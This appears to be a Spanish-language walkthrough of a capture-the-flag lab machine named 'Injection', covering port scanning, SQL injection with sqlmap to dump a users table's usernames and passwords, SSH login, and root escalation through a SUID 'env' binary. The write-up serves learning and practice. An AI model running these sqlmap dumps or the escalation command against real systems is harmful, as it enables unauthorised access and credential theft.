# Injection

* Máquina **atacante** -> 172.17.0.1
* Máquina **objetivo** -> 172.17.0.2 | Linux :penguin:

### Escaneo de puertos

Realizamos un escaneo de puertos con *nmap* para ver puertos abiertos de la máquina **objetivo**:
```shell
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```
![Resultado escaneo](/Capturas/2024-10-19_16-23.png)

### Inyección SQL

Tras el escaneo, vemos que la máquina **objetivo** tiene dos puertos abiertos, el **22**(*ssh*) y el **80**(*http*). Así que procedemos a ir a nuestro navegador y ver qué tenemos corriendo por el puerto **80**. Esto nos lleva a un **panel de login**, por lo que procederemos a realizar un **ataque de inyección SQL** con *sqlmap*:
```shell
sqlmap -u http://172.17.0.2/ --forms --dbs --batch
```
![resultado bbdd](/Capturas/2024-10-19_16-48.png)

Tras realizar una búsqueda de BBDD, encontramos una interesante llamada **register**, por lo que enumeraremos las tablas en busca de más información:
```shell
sqlmap -u http://172.17.0.2/ --forms -D register --tables --batch
```
![resultado tablas](/Capturas/2024-10-19_16-51.png)

Vemos que hay una tabla llamada **users**, así que continuamos enumerando ahora las columnas de dicha tabla:
```shell
sqlmap -u http://172.17.0.2/ --forms -D register -T users --columns --batch
```
![resultado columnas](/Capturas/2024-10-19_16-55.png)

Encontramos dos columnas: **passwd** y **username**. Y ya sólo nos queda volcar los registros contenidos en dichas columnas:
```shell
sqlmap -u http://172.17.0.2/ --forms -D register -T users -C passwd,username --dump --batch
```
![resultado registros](/Capturas/2024-10-19_16-59.png)

Y ya tenemos un **usuario** y una **contraseña** con los que podemos probar a entrar.

### Acceso vía SSH

Accedemos a la máquina **objetivo** vía *ssh* con las credenciales encontradas:

![acceso ssh](/Capturas/2024-10-19_17-04.png)

### Escalada de privilegios

Enumeramos los binarios SUID de la máquina **objetivo**:
```shell
find / -perm -4000 2>/dev/null
```
![enumeracion de binarios](/Capturas/2024-10-19_17-11.png)

Escalamos privilegios aprovechándonos del binario **env**:
```shell
env /bin/sh -p
```
![escalada](/Capturas/2024-10-19_17-14.png)

Y ya somos usuario **root** :triangular_flag_on_post: